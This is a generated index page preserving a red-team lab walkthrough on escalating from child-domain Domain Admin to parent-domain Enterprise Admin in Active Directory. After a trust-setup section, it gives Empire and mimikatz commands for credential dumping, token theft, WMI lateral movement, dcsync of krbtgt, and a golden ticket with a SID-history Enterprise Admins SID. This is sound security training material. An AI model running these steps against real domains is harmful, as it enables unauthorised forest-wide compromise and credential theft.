---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# From Domain Admin to Enterprise Admin

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-child-domain-da-to-ea-in-parent-domain` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [From Domain Admin to Enterprise Admin](../../topics/offensive-security-experiments/from-domain-admin-to-enterprise-admin.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-child-domain-da-to-ea-in-parent-domain |
| name | From Domain Admin to Enterprise Admin |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain.md |

## Preserved Source Material

````yaml
_asset_filenames:
- domain-trust-conditional-forwarders.png
- domain-trust-one-way-incoming-created.png
- domain-trust-one-way-incoming.png
- domain-trusts-forest.png
- domain-trusts-nltest.png
- domain-trusts-notfound.png
- domain-trusts-shared (1).png
- domains-nltest.png
- domains-trusts-powershell.png
- domains-trusts1.png
- domains-trusts2.png
- empire-1st-agent.png
- empire-agent-from-rootdomain.png
- empire-childdc-recon.png
- empire-creds.png
- empire-dir-childdc.png
- empire-enterprise-admin.png
- empire-get-dcname.png
- empire-golden-ticket.png
- empire-krbtgt-hash.png
- empire-krbtgt-sid.png
- empire-lateral-childdc.png
- empire-mimikatz.png
- empire-ps (1).png
- empire-stealtoken.png
- empire-trusts.png
_body: "---\ndescription: >-\n  Explore Parent-Child Domain Trust Relationships and abuse it for Privilege\n  Escalation\n\
  ---\n\n# From Domain Admin to Enterprise Admin\n\nThis lab is based on an [Empire Case Study](https://enigma0x3.net/2016/01/28/an-empire-case-study/)\
  \ and its goal is to get more familiar with some of the concepts of Powershell Empire and its modules as well as Active\
  \ Directory concepts such as Forests, Parent/Child domains and Trust Relationships and how they can be abused to escalate\
  \ privileges.\n\nThe end goal of this lab is a privilege escalation from DA on a child domain to EA on a root domain.\n\n\
  ## Domain Trust Relationships\n\nFirstly, some LAB setup - we need to create a child domain controller as well as a new\
  \ forest with a new domain controller.\n\n### Parent / Child Domains\n\nAfter installing a child domain `red.offense.local`\
  \ of a parent domain `offense.local`, Active Directory Domains and Trusts show the parent-child relationship between the\
  \ domains as well as their default trusts:\n\n![](../../.gitbook/assets/domains-trusts1.png)\n\nTrusts between the two domains\
  \ could be checked from powershell by issuing:\n\n```csharp\nGet-ADTrust -Filter *\n```\n\nThe first console shows the domain\
  \ trust relationship from `offense.local` perspective and the second one from `red.offense.local`. Note the the direction\
  \ is `BiDirectional` which means that members can authenticate from one domain to another when they want to access shared\
  \ resources:\n\n![](../../.gitbook/assets/domains-trusts2.png)\n\nSimilar, but very simplified information could be gleaned\
  \ from a native Windows binary:\n\n```\nnltest /domain_trusts\n```\n\n![](../../.gitbook/assets/domains-nltest.png)\n\n\
  Powershell way of checking trust relationships:\n\n```csharp\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n\
  ```\n\n![](../../.gitbook/assets/domains-trusts-powershell.png)\n\n### Forests\n\nAfter installing a new DC `dc-blue` in\
  \ a new forest, let's setup a one way trust between `offense.local` and `defense.local` domains using controllers `dc-mantvydas.offense.local`\
  \ and `dc-blue.defense.blue`.\n\nFirst of, setting up conditional DNS forwarders on both DCs:\n\n![](../../.gitbook/assets/domain-trust-conditional-forwarders.png)\n\
  \nAdding a new trust by making `dc-mantvydas` a trusted domain:\n\n![](../../.gitbook/assets/domain-trust-one-way-incoming.png)\n\
  \nSetting the trust type to `Forest`:\n\n![](../../.gitbook/assets/domain-trusts-forest.png)\n\nIncoming trust for `dc-mantvydas.offense.local`\
  \ is now created:\n\n![](../../.gitbook/assets/domain-trust-one-way-incoming-created.png)\n\nTesting nltest output:\n\n\
  ![](../../.gitbook/assets/domain-trusts-nltest.png)\n\n### Forests Test\n\nNow that the trust relationship is set, it is\
  \ easy to check if it was done correctly. What should happen now is that resources on defense.local (trusting domain) should\
  \ be available to members of offense.local (trusted domain).\n\nNote how the user on `dc-mantvydas.offense.local` is not\
  \ able to share a folder to `defense\\administrator` (because `offense.local` does not trust `defense.local`):\n\n![](../../.gitbook/assets/domain-trusts-notfound.png)\n\
  \nHowever, `dc-blue.defense.local`, trusts `offense.local`, hence is able to share a resource to one of the members of `offense.local`\
  \ - forest trust relationships work as intended:\n\n![](<../../.gitbook/assets/domain-trusts-shared (1).png>)\n\n## Back\
  \ to Empire: From DA to EA\n\nAssume we got our first agent back from the computer `PC-MANTVYDAS$`:\n\n![](../../.gitbook/assets/empire-1st-agent.png)\n\
  \n### Credential Dumping\n\nSince the agent is running within a high integrity process, let's dump credentials - some interesting\
  \ credentials can be observed for a user in `red.offense.local` domain:\n\n![](../../.gitbook/assets/empire-mimikatz.png)\n\
  \nListing the processes with `ps`, we can see a number of process running under the `red\\spotless` account. Here is one:\n\
  \n![](<../../.gitbook/assets/empire-ps (1).png>)\n\nThe domain user is of interest, so we would use a `usemodule situational_awareness/network/powerview/get_user`\
  \ command to enumerate the red\\spotless user and see if it is a member of any interesting groups, however my empire instance\
  \ did not seem to return any results for this command. For this lab, assume it showed that the user red\\spotless is a member\
  \ of `Administrators` group on the `red.offense.local` domain.\n\n### Token Manipulation\n\nLet's steal the token of a process\
  \ with PID 4900 that runs with `red\\spotless` credentials:\n\n![](../../.gitbook/assets/empire-stealtoken.png)\n\n### DC\
  \ Recon\n\nAfter assuming privileges of the member red\\spotless, let's get the Domain Controller computer name for that\
  \ user. Again, my Empire instance is buggy, so I used a custom command to get it:\n\n```csharp\nshell [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers\
  \ | ForEach-Object { $_.Name }\n```\n\n![](../../.gitbook/assets/empire-get-dcname.png)\n\nCheck if we have admin access\
  \ to the `DC-RED`:\n\n```csharp\nshell dir \\\\dc-red.red.offense.local\\c$\n```\n\n![](../../.gitbook/assets/empire-dir-childdc.png)\n\
  \nWe are lucky, the user is a domain admin as can be seen from the above screenshot.\n\n### Lateral Movement\n\nLet's get\
  \ an agent from `DC-RED` - note that the credentials are coming from the previous dump with mimikatz:\n\n```csharp\nusemodule\
  \ lateral_movement/invoke_wmi\n```\n\n![](../../.gitbook/assets/empire-lateral-childdc.png)\n\nWe now have the agent back,\
  \ let's just confirm it:\n\n![](../../.gitbook/assets/empire-childdc-recon.png)\n\n### Checking Trust Relationships\n\n\
  Once in DC-RED, let's check any domain trust relationships:\n\n```csharp\nusemodule situational_awareness/network/powerview/get_domain_trust\n\
  ```\n\n![](../../.gitbook/assets/empire-trusts.png)\n\nWe see that the `red.offense.local` is a child domain of `offense.local`\
  \ domain, which is automatically trusting and trusted (two way trust/bidirectional) with `offense.local` - read on.\n\n\
  ### From DA to EA\n\nWe will now try to escalate from DA in `red.offense.local` to EA in `offense.local`. We need to create\
  \ a golden ticket for `red.offense.local` and forge it to make us an EA in `offense.local`.\n\nFirst of, getting a SID of\
  \ a `krbtgt` user account in `offense.local`:\n\n```csharp\n(Empire: powershell/situational_awareness/network/powerview/get_domain_trust)\
  \ > usemodule powershell/management/user_to_sid\n(Empire: powershell/management/user_to_sid) > set Domain offense.local\n\
  (Empire: powershell/management/user_to_sid) > set User krbtgt\n(Empire: powershell/management/user_to_sid) > run\n```\n\n\
  ![](../../.gitbook/assets/empire-krbtgt-sid.png)\n\nAfter getting a SID of the `offense.local\\krbtgt`, we need to get a\
  \ password hash of the `krbtgt` account in the compromised DC `DC-RED` (we can extract it since we are a domain admin in\
  \ `red.offense.local`):\n\n```csharp\n(Empire: powershell/management/user_to_sid) > usemodule powershell/credentials/mimikatz/dcsync\n\
  (Empire: powershell/credentials/mimikatz/dcsync) > set user red\\krbtgt\n(Empire: powershell/credentials/mimikatz/dcsync)\
  \ > execute\n```\n\n![](../../.gitbook/assets/empire-krbtgt-hash.png)\n\n### Golden Ticket for Root Domain\n\nWe can now\
  \ generate a golden ticket for `offense.local\\Domain Admins`since we have the SID of the `offense.local\\krbtgt` and the\
  \ hash of `red.offense.local\\krbtgt`:\n\n```csharp\nusemodule powershell/credentials/mimikatz/golden_ticket\n(Empire: powershell/credentials/mimikatz/golden_ticket)\
  \ > set user hakhak\n(Empire: powershell/credentials/mimikatz/golden_ticket) > set sids S-1-5-21-4172452648-1021989953-2368502130-519\n\
  (Empire: powershell/credentials/mimikatz/golden_ticket) > set CredID 8\n(Empire: powershell/credentials/mimikatz/golden_ticket)\
  \ > run\n```\n\nNote how during `sids` specification, we replaced the last three digits from 502 (krbtgt) to 519 (enterprise\
  \ admins) - this part of the process is called a SID History Attack:\n\n```csharp\nset sids S-1-5-21-4172452648-1021989953-2368502130-519\n\
  ```\n\n![](../../.gitbook/assets/empire-golden-ticket.png)\n\nThe `CredID` property in the dcsync module comes from the\
  \ Empire's credential store which previously got populated by our mimikatz'ing:\n\n![](../../.gitbook/assets/empire-creds.png)\n\
  \nWe now should be Enterprise Admin in `offense.local`and we can test it by listing the admin share `c$` of the `dc-mantvydas.offense.local:`\n\
  \n```csharp\nshell dir \\\\dc-mantvydas\\c$\n```\n\n![](../../.gitbook/assets/empire-enterprise-admin.png)\n\n### Agent\
  \ from Root Domain\n\nFor the sake of fun and wrapping this lab up, let's get an agent from the `dc-mantvydas`:\n\n![](../../.gitbook/assets/empire-agent-from-rootdomain.png)\n\
  \n## Alternative: Exploit writeable Configuration NC\n\nThe Configuration NC is the primary repository for configuration\
  \ information for a forest and is replicated to every DC in the forest. Every writable DC (not read-only DCs) in the forest\
  \ holds a writable copy of the Configuration NC. Exploiting this require running as SYSTEM on a (child) DC.\n\nIt is possible\
  \ to compromise the root domain in various ways. Examples:\n\n* [Link GPO to to root DC site](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)\n\
  * [Compromise gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)\n\
  * [Schema attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)\n\
  * Exploit ADCS - Create/modify certificate template to allow authentication as any user (e.g. Enterprise Admins)\n\nSID\
  \ filtering prevents the SID history attack, but not this one.\n\n## References\n\n{% embed url=\"https://enigma0x3.net/2016/01/28/an-empire-case-study/\"\
  \ %}\n\n{% embed url=\"http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/\" %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc731404(v%3dws.10)\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=winserver2012-ps\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)\"\
  \ %}\n\n{% embed url=\"https://support.microsoft.com/en-gb/help/243330/well-known-security-identifiers-in-windows-operating-systems\"\
  \ %}"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain.md
````
